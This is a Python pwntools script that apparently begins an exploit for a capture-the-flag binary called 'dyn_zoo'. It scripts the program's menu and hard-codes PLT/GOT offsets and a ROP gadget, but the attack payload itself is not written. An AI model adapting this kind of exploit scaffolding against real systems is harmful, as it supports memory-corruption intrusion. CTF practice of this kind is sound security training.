from pwn import *

context.log_level = 'debug'

def Build_New_Cage(monkey, name):
	p.recvuntil('---->')
	p.sendline('1')

	p.sendlineafter('How big is new monkey :', monkey)
	p.sendlineafter('What is his/her name :', name)

def Watch_Animals(cage):
	p.recvuntil('---->')
	p.sendline('2')

	p.sendlineafter('Which cage :', cage)

def Rename_Animals(rename, name):
	p.recvuntil('---->')
	p.sendline('3')

	p.sendlineafter('Which animal to rename :', rename)
	p.sendlineafter('New name :', name)

def Rename_Zoo(name):
	p.recvuntil('---->')
	p.sendline('4')

	p.sendlineafter('New name :', name)

def Leave_Zoo():
	p.recvuntil('---->')
	p.sendline('5')


p = process('./dyn_zoo')
#p = remote('',)
e = ELF('./dyn_zoo')
l = e.libc
#l = ELF('./')


malloc_plt = 0xa28
puts_plt = 0x9d8
read_plt = 0x9f8
free_plt = 0x9d0

malloc_got = 0x202fc0
puts_got = 0x202f70
read_got = 0x202f90
free_got = 0x202f60

p_rdi_r = 0x0000000000001703
pause()

p.interactive()